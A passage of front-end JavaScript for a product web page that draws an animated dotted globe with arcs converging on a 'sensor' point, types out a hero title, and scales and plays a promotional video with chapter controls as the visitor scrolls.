            var n = Math.min(89, Math.floor((90 - lat) / 2)) * 180 + Math.min(179, Math.floor((lon + 180) / 2));
            return (bits.charCodeAt(n >> 3) >> (7 - (n & 7))) & 1;
        }
        // Globe space: y is north, longitude 0 faces +z, east is +x.
        function vec(lat, lon) {
            var c = Math.cos(lat * RAD);
            return [Math.sin(lon * RAD) * c, Math.sin(lat * RAD), Math.cos(lon * RAD) * c];
        }
        // An even spread of points over the sphere (golden-angle spiral); keep the ones on land.
        var DOTS = [];
        var N = 15000, GA = Math.PI * (3 - Math.sqrt(5));
        for (var i = 0; i < N; i++) {
            var y = 1 - (i + 0.5) * 2 / N, r = Math.sqrt(1 - y * y), th = i * GA;
            var x = Math.cos(th) * r, z = Math.sin(th) * r;
            if (land(Math.asin(y) / RAD, Math.atan2(x, z) / RAD)) DOTS.push([x, y, z]);
        }
        var CENTER = [26, 44];      // latitude and longitude the view rests on
        var SENSOR = vec(31, 36);
        var TILT = CENTER[0] * RAD;
        var PALETTE = [[255, 110, 40], [255, 96, 130], [244, 75, 204], [176, 110, 250], [124, 104, 255], [83, 58, 253]];
        var RUBY = [234, 34, 97], BRAND = [83, 58, 253];
        var rnd = seeded(23);
        var arcs = [], rings = [], nextArc = 0;
        var cs = 1, sn = 0, ct = Math.cos(TILT), st = Math.sin(TILT);
        var P = [0, 0, 0];
        // rotate into view space: out = [right, up, towards the viewer]
        function turn(v, k) {
            var x = v[0] * cs - v[2] * sn, z = v[0] * sn + v[2] * cs;
            P[0] = x * k;
            P[1] = (v[1] * ct - z * st) * k;
            P[2] = (v[1] * st + z * ct) * k;
            return P;
        }
        var buckets = [];
        for (var b = 0; b < PALETTE.length * 3; b++) buckets.push([]);

        stage(cv, function (ctx, w, h, t) {
            var R = Math.min(w * 0.74, h * 0.82);
            var cx = w * 0.6, cy = h * 0.2 + R;
            var lon0 = (CENTER[1] + (REDUCED ? 0 : 24 * Math.sin(t * 0.09))) * RAD;
            cs = Math.cos(lon0);
            sn = Math.sin(lon0);
            var i, k, p;

            // the body of the sphere
            var g = ctx.createRadialGradient(cx - R * 0.35, cy - R * 0.45, R * 0.1, cx, cy, R);
            g.addColorStop(0, 'rgba(255,255,255,0.95)');
            g.addColorStop(1, 'rgba(232,233,255,0.55)');
            ctx.fillStyle = g;
            ctx.beginPath();
            ctx.arc(cx, cy, R, 0, 6.2832);
            ctx.fill();

            for (k = 0; k < buckets.length; k++) buckets[k].length = 0;
            for (i = 0; i < DOTS.length; i++) {
                p = turn(DOTS[i], 1);
                if (p[2] <= 0.02) continue;
                var sx = cx + p[0] * R, sy = cy - p[1] * R;
                if (sx < -4 || sx > w + 4 || sy < -4 || sy > h + 4) continue;
                // colour runs from the upper right to the lower left
                var q = clamp01(0.5 - p[0] * 0.42 - p[1] * 0.42);
                var ci = Math.min(PALETTE.length - 1, Math.floor(q * PALETTE.length));
                var di = p[2] > 0.66 ? 2 : p[2] > 0.33 ? 1 : 0;
                buckets[ci * 3 + di].push(sx, sy);
            }
            var rad = Math.max(0.85, R / 300);
            for (k = 0; k < buckets.length; k++) {
                var list = buckets[k];
                if (!list.length) continue;
                ctx.globalAlpha = [0.3, 0.6, 0.92][k % 3];
                ctx.fillStyle = rgba(PALETTE[(k / 3) | 0]);
                ctx.beginPath();
                for (i = 0; i < list.length; i += 2) {
                    ctx.moveTo(list[i] + rad, list[i + 1]);
                    ctx.arc(list[i], list[i + 1], rad, 0, 6.2832);
                }
                ctx.fill();
            }
            ctx.globalAlpha = 1;

            p = turn(SENSOR, 1);
            var hx = cx + p[0] * R, hy = cy - p[1] * R;

            if (!REDUCED) {
                // a new probe now and then, from a land point that is facing us
                if (t > nextArc) {
                    nextArc = t + 0.5 + rnd() * 0.7;
                    for (k = 0; k < 12; k++) {
                        var src = DOTS[Math.floor(rnd() * DOTS.length)];
                        var d = src[0] * SENSOR[0] + src[1] * SENSOR[1] + src[2] * SENSOR[2];
                        if (turn(src, 1)[2] > 0.3 && d < 0.94 && d > -0.1) {
                            arcs.push({ a: src, ang: Math.acos(d), born: t, dur: 1.5 + rnd() * 0.7, hit: false });
                            break;
                        }
                    }
                }
                ctx.lineWidth = 1.2;
                ctx.lineCap = 'round';
                for (i = arcs.length - 1; i >= 0; i--) {
                    var arc = arcs[i];
                    var prog = (t - arc.born) / arc.dur;
                    if (prog > 1.45 || prog < 0) { arcs.splice(i, 1); continue; }
                    if (prog >= 1 && !arc.hit) { arc.hit = true; rings.push(t); }
                    var e = clamp01(prog);
                    var head = e * e * (3 - 2 * e);
                    var tail = prog > 1 ? clamp01((prog - 1) / 0.45) : Math.max(0, head - 0.42);
                    var sinA = Math.sin(arc.ang), lift = 0.1 + 0.2 * arc.ang;
                    var px = 0, py = 0, drawn = false, steps = 22;
                    var fade = prog > 1 ? 1 - tail : 1;
                    for (k = 0; k <= steps; k++) {
                        var s = mix(tail, head, k / steps);
                        var k1 = Math.sin((1 - s) * arc.ang) / sinA, k2 = Math.sin(s * arc.ang) / sinA;
                        P[0] = arc.a[0] * k1 + SENSOR[0] * k2;
                        P[1] = arc.a[1] * k1 + SENSOR[1] * k2;
                        P[2] = arc.a[2] * k1 + SENSOR[2] * k2;
                        p = turn([P[0], P[1], P[2]], 1 + lift * Math.sin(Math.PI * s));
                        var x2 = cx + p[0] * R, y2 = cy - p[1] * R;
                        if (k && p[2] > 0) {
                            ctx.strokeStyle = rgba(RUBY, fade * 0.9 * (k / steps));
                            ctx.beginPath();
                            ctx.moveTo(px, py);
                            ctx.lineTo(x2, y2);
                            ctx.stroke();
                            drawn = true;
                        }
                        px = x2;
                        py = y2;
                    }
                    if (drawn && prog < 1) {
                        ctx.fillStyle = rgba(RUBY, 1);
                        ctx.beginPath();
                        ctx.arc(px, py, 2.2, 0, 6.2832);
                        ctx.fill();
                    }
                }
                for (i = rings.length - 1; i >= 0; i--) {
                    var age = (t - rings[i]) / 0.9;
                    if (age > 1 || age < 0) { rings.splice(i, 1); continue; }
                    ctx.strokeStyle = rgba(BRAND, 0.55 * (1 - age));
                    ctx.lineWidth = 1.4;
                    ctx.beginPath();
                    ctx.arc(hx, hy, 4 + 18 * easeOut(age), 0, 6.2832);
                    ctx.stroke();
                }
            }

            // the sensor
            ctx.fillStyle = rgba(BRAND, 0.16);
            ctx.beginPath();
            ctx.arc(hx, hy, 9, 0, 6.2832);
            ctx.fill();
            ctx.fillStyle = rgba(BRAND, 1);
            ctx.strokeStyle = '#fff';
            ctx.lineWidth = 1.5;
            ctx.beginPath();
            ctx.arc(hx, hy, 3.6, 0, 6.2832);
            ctx.fill();
            ctx.stroke();
        });
    }

    /* ------------------------------------------------------------------
       The hero title is typed once, a character at a time with a slightly
       uneven rhythm, then the caret blinks a few times and leaves.
       Without motion the title is simply there.
       ------------------------------------------------------------------ */
    function initTyped() {
        var root = document.querySelector('[data-typed]');
        if (!root) return;
        if (REDUCED) { root.setAttribute('data-typed', 'on'); return; }
        var chars = [];
        root.querySelectorAll('[data-typed-line]').forEach(function (line, li) {
            var text = line.textContent;
            line.textContent = '';
            text.split('').forEach(function (c) {
                var s = document.createElement('span');
                s.className = 'ch';
                s.textContent = c;
                line.appendChild(s);
                chars.push({ el: s, line: li, space: c === ' ' });
            });
        });
        var caret = document.createElement('i');
        caret.className = 'typed-caret idle';
        chars[0].el.before(caret);
        root.setAttribute('data-typed', 'on');

        var i = 0;
        function next() {
            if (i >= chars.length) {
                caret.classList.add('idle');
                setTimeout(function () { caret.classList.add('gone'); }, 2400);
                return;
            }
            var c = chars[i];
            caret.classList.remove('idle');
            c.el.classList.add('on');
            c.el.after(caret);
            i++;
            // even-ish typing with a small repeatable wobble, a breath between the two lines
            var wait = 52 * (0.75 + 0.5 * ((i * 0.618034) % 1)) * (c.space ? 1.4 : 1);
            if (i < chars.length && chars[i].line !== c.line) { wait = 380; caret.classList.add('idle'); }
            setTimeout(next, wait);
        }
        setTimeout(next, 520);
    }

    /* ------------------------------------------------------------------
       The film grows with the scroll: half size as it comes up from under
       the hero, full size when it reaches its place, where it sticks for a
       while (css: .film-zone). It plays only while it is on screen, starts
       muted, and has its own two buttons. No growing and no autoplay when
       the visitor asked for reduced motion.
       ------------------------------------------------------------------ */
    function initFilm() {
        var film = document.querySelector('[data-film]');
        var zone = document.querySelector('[data-film-zone]');
        var scaler = document.querySelector('[data-film-scale]');
        if (!film || !zone || !scaler) return;
        var toggle = document.querySelector('[data-film-toggle]');
        var sound = document.querySelector('[data-film-sound]');
        var nav = document.querySelector('[data-nav]');
        var userPaused = false;

        function play() { var p = film.play(); if (p && p.catch) p.catch(function () {}); }
        function reflect() {
            var on = !film.paused;
            toggle.classList.toggle('is-playing', on);
            toggle.setAttribute('aria-label', on ? 'Pause' : 'Play');
        }
        film.addEventListener('play', reflect);
        film.addEventListener('pause', reflect);
        toggle.addEventListener('click', function () {
            if (film.paused) { userPaused = false; play(); } else { userPaused = true; film.pause(); }
        });
        sound.addEventListener('click', function () {
            film.muted = !film.muted;
            sound.setAttribute('aria-pressed', String(!film.muted));
            sound.setAttribute('aria-label', film.muted ? 'Turn sound on' : 'Turn sound off');
        });

        // Chapters: the current one fills as it plays, a click jumps to its start.
        var list = document.querySelector('[data-film-chapters]');
        if (list) {
            var chaps = [].slice.call(list.querySelectorAll('button'));
            var starts = chaps.map(function (b) { return parseFloat(b.getAttribute('data-t')); });
            var END = parseFloat(list.getAttribute('data-film-end')); // the sign-off belongs to no chapter
            var current = -1;
            var mark = function () {
                var t = film.currentTime, i = -1;
                if (t < END) for (var k = 0; k < starts.length; k++) if (t >= starts[k] - 0.05) i = k;
                if (i !== current) {
                    current = i;
                    chaps.forEach(function (b, k) {
                        b.classList.toggle('on', k === i);
                        if (k === i) b.setAttribute('aria-current', 'true'); else b.removeAttribute('aria-current');
                        b.style.setProperty('--p', 0);
                    });
                    // on narrow screens the row scrolls sideways: keep the current chapter in sight
                    if (i >= 0 && list.scrollWidth > list.clientWidth) list.scrollTo({ left: chaps[i].parentElement.offsetLeft - 16, behavior: 'smooth' });
                }
                if (i >= 0) {
                    var end = i + 1 < starts.length ? starts[i + 1] : END;
                    chaps[i].style.setProperty('--p', clamp01((t - starts[i]) / (end - starts[i])).toFixed(3));
                }
            };
            film.addEventListener('timeupdate', mark);
            chaps.forEach(function (b, k) {
                b.addEventListener('click', function () {
                    var go = function () { film.currentTime = starts[k] + 0.05; };
                    if (film.readyState >= 1) go(); else film.addEventListener('loadedmetadata', go, { once: true });
                    userPaused = false;
                    play();
                });
            });
        }
        if (REDUCED) return;

        var START = 0.5; // the reference grows from half size
        var ticking = false;
        function frame() {
            ticking = false;
            var vh = window.innerHeight;
            var r = zone.getBoundingClientRect();
            var top = parseFloat(getComputedStyle(zone.firstElementChild).top) || 0; // where it sticks
            // 0 when the zone's top edge enters at the bottom of the window, 1 when it reaches its place
            var p = clamp01((vh - r.top) / Math.max(1, vh - top));
            var s = START + (1 - START) * easeOut(p);
            scaler.style.setProperty('--film-s', s.toFixed(4));
            var visible = p > 0.22 && r.bottom > vh * 0.3;
            if (visible && film.paused && !userPaused) play();
            if (!visible && !film.paused) film.pause();
            // while it fills the window the navigation steps aside, if the two would overlap
            if (nav) {
                var full = p > 0.92 && r.bottom > top + scaler.offsetHeight * 0.55;
                nav.classList.toggle('nav-away', full && top < nav.offsetHeight + 8 && !nav.classList.contains('open'));
            }
        }
        function onScroll() { if (!ticking) { ticking = true; requestAnimationFrame(frame); } }
        window.addEventListener('scroll', onScroll, { passive: true });
        window.addEventListener('resize', onScroll);
        // the hero above changes height when the fonts arrive
        window.addEventListener('load', onScroll);
        if (document.fonts && document.fonts.ready) document.fonts.ready.then(onScroll);
        frame();
    }

    /* ------------------------------------------------------------------
       The wave of symbols moves only while it is on screen (css: .symbols).
       ------------------------------------------------------------------ */
    function initSymbols() {
        var row = document.querySelector('[data-symbols]');
        if (!row || REDUCED || !('IntersectionObserver' in window)) return;
        new IntersectionObserver(function (entries) {
            row.classList.toggle('is-live', entries[0].isIntersecting);
        }).observe(row);
    }

    initTyped();
    initSymbols();
    initLive();
    initFilm();
    initFlow();
    initTiles();
    initGlobe();
    initStory();
    initStrands();
    initReplay();
    initBurst();
    initArch();
})();
